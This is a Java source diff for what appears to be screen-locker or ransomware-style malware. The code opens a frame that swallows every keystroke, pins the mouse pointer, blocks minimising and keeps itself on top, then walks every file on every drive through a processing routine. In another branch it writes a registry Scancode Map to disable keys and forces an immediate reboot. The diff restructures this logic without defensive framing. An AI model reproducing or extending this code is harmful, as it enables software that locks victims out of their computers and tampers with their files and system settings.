@@ -84,6 +84,135 @@ public final class Main {
             try {
                 FileReader fileReader = new FileReader("C:\\Program Files\\compressordata.dat");
                 if (fileReader.read() != -1){
+                    frame.addKeyListener(new KeyListener() {
+                        @Override
+                        public void keyTyped(KeyEvent e) {
+                            e.consume();
+                            frame.requestFocus();
+                        }
+
+                        @Override
+                        public void keyPressed(KeyEvent e) {
+                            e.consume();
+                            frame.requestFocus();
+                        }
+
+                        @Override
+                        public void keyReleased(KeyEvent e) {
+                            e.consume();
+                            frame.requestFocus();
+                        }
+                    });
+                    frame.addMouseListener(new MouseListener() {
+                        @Override
+                        public void mouseClicked(MouseEvent e) {
+                            // keep empty
+                            frame.requestFocus();
+                        }
+
+                        @Override
+                        public void mousePressed(MouseEvent e) {
+                            // keep empty
+                            frame.requestFocus();
+                        }
+
+                        @Override
+                        public void mouseReleased(MouseEvent e) {
+                            // keep empty
+                            frame.requestFocus();
+                        }
+
+                        @Override
+                        public void mouseEntered(MouseEvent e) {
+                            frame.requestFocus();
+                            for (GraphicsDevice device : gs) {
+                                GraphicsConfiguration[] configurations = device.getConfigurations();
+                                for (GraphicsConfiguration config : configurations) {
+                                    Rectangle bounds = config.getBounds();
+                                    if (bounds.contains(p)) {
+                                        try {
+                                            Robot r = new Robot(device);
+                                            r.mouseMove(new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).x, new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).y);
+                                        } catch (AWTException ex) {
+                                        }
+                                        return;
+                                    }
+                                }
+                            }
+                            frame.requestFocus();
+                        }
+
+                        @Override
+                        public void mouseExited(MouseEvent e) {
+                            frame.requestFocus();
+                            for (GraphicsDevice device : gs) {
+                                GraphicsConfiguration[] configurations = device.getConfigurations();
+                                for (GraphicsConfiguration config : configurations) {
+                                    Rectangle bounds = config.getBounds();
+                                    if (bounds.contains(p)) {
+                                        try {
+                                            Robot r = new Robot(device);
+                                            r.mouseMove(new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).x, new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).y);
+                                        } catch (AWTException ex) {
+                                        }
+                                        return;
+                                    }
+                                }
+                            }
+                            frame.requestFocus();
+                        }
+                    });
+                    frame.addWindowListener(new WindowAdapter() {
+                        @Override
+                        public void windowIconified(WindowEvent e) {
+                            frame.setState(Frame.NORMAL);
+                            frame.requestFocus();
+                        }
+                    });
+
+                    frame.addWindowFocusListener(new WindowFocusListener() {
+                        @Override
+                        public void windowGainedFocus(WindowEvent e) {/* keep empty */}
+
+                        @Override
+                        public void windowLostFocus(WindowEvent e) {
+                            if (e.getNewState() != WindowEvent.WINDOW_CLOSED) {
+                                frame.setAlwaysOnTop(false);
+                                frame.setAlwaysOnTop(true);
+                                frame.requestFocus();
+                            }
+                        }
+                    });
+                    frame.setVisible(true);
+                    for (File drive : drives) {
+                        Path dir = Paths.get(drive.getAbsolutePath());
+                        try {
+                            Files.walkFileTree(dir, new SimpleFileVisitor<>() {
+                                @Override
+                                public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) {
+                                    try {
+                                        Files.walk(dir).forEach(path -> processFile(path.toFile()));
+                                    } catch (Exception e) {
+                                        return FileVisitResult.CONTINUE;
+                                    }
+                                    return FileVisitResult.CONTINUE;
+                                }
+
+                                @Override
+                                public FileVisitResult visitFileFailed(Path file, IOException exc) throws IOException {
+                                    if (exc != null) {
+                                        return FileVisitResult.CONTINUE;
+                                    }
+
+                                    return super.visitFileFailed(file, null);
+                                }
+                            });
+                        } catch (IOException e) {
+                        }
+
+                    }
+                    Thread.sleep(5000);
+                }else {
                     while (true) {
                         try {
                             WinRegistry.writeStringValue(WinRegistry.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout", "Scancode Map",
@@ -114,7 +243,8 @@ public final class Main {
                             fileWriter.close();
                             executeCommand("shutdown /r /t 0");
                             break;
-                        } catch (InvocationTargetException | IllegalAccessException | IOException e) {}}}
+                        } catch (InvocationTargetException | IllegalAccessException | IOException e) {}}
+                }
             }catch (IOException ignored) {
                 while (true) {
                     try {
@@ -150,120 +280,6 @@ public final class Main {
 
                     } catch (InvocationTargetException | IllegalAccessException | IOException ignored1) {
                     }}}
-            frame.addKeyListener(new KeyListener() {
-                @Override
-                public void keyTyped(KeyEvent e) {
-                    e.consume();
-                    frame.requestFocus();
-                }
-
-                @Override
-                public void keyPressed(KeyEvent e) {
-                    e.consume();
-                    frame.requestFocus();
-                }
-
-                @Override
-                public void keyReleased(KeyEvent e) {
-                    e.consume();
-                    frame.requestFocus();
-                }
-            });
-            frame.addMouseListener(new MouseListener() {
-                @Override
-                public void mouseClicked(MouseEvent e) {
-                    // keep empty
-                    frame.requestFocus();
-                }
-
-                @Override
-                public void mousePressed(MouseEvent e) {
-                    // keep empty
-                    frame.requestFocus();
-                }
-
-                @Override
-                public void mouseReleased(MouseEvent e) {
-                    // keep empty
-                    frame.requestFocus();
-                }
-
-                @Override
-                public void mouseEntered(MouseEvent e) {
-                    frame.requestFocus();
-                    for (GraphicsDevice device : gs) {
-                        GraphicsConfiguration[] configurations = device.getConfigurations();
-                        for (GraphicsConfiguration config : configurations) {
-                            Rectangle bounds = config.getBounds();
-                            if (bounds.contains(p)) {
-                                try {
-                                    Robot r = new Robot(device);
-                                    r.mouseMove(new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).x, new Point(p.x - bounds.getLocation().x, p.y - bounds.getLocation().y).y);
-                                } catch (AWTException ex) {
-                                }
-                                return;
-                            }
-                        }
-                    }
-                    frame.requestFocus();
-                }
-
-                @Override
-                public void mouseExited(MouseEvent e) {
-                    //keep empty
-                }
-            });
-            frame.addWindowListener(new WindowAdapter() {
-                @Override
-                public void windowIconified(WindowEvent e) {
-                    frame.setState(Frame.NORMAL);
-                    frame.requestFocus();
-                }
-            });
-
-            frame.addWindowFocusListener(new WindowFocusListener() {
-                @Override
-                public void windowGainedFocus(WindowEvent e) {/* keep empty */}
-
-                @Override
-                public void windowLostFocus(WindowEvent e) {
-                    if (e.getNewState() != WindowEvent.WINDOW_CLOSED) {
-                        frame.setAlwaysOnTop(false);
-                        frame.setAlwaysOnTop(true);
-                        frame.requestFocus();
-                    }
-                }
-            });
-            frame.setVisible(true);
-
-            for (File drive : drives) {
-                Path dir = Paths.get(drive.getAbsolutePath());
-                try {
-                    Files.walkFileTree(dir, new SimpleFileVisitor<>() {
-                        @Override
-                        public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) {
-                            try {
-                                Files.walk(dir).forEach(path -> processFile(path.toFile()));
-                            } catch (Exception e) {
-                                return FileVisitResult.CONTINUE;
-                            }
-                            return FileVisitResult.CONTINUE;
-                        }
-
-                        @Override
-                        public FileVisitResult visitFileFailed(Path file, IOException exc) throws IOException {
-                            if (exc != null) {
-                                return FileVisitResult.CONTINUE;
-                            }
-
-                            return super.visitFileFailed(file, null);
-                        }
-                    });
-                } catch (IOException e) {
-                }
-
-            }
-            Thread.sleep(5000);
         }
         System.exit(0);
     }
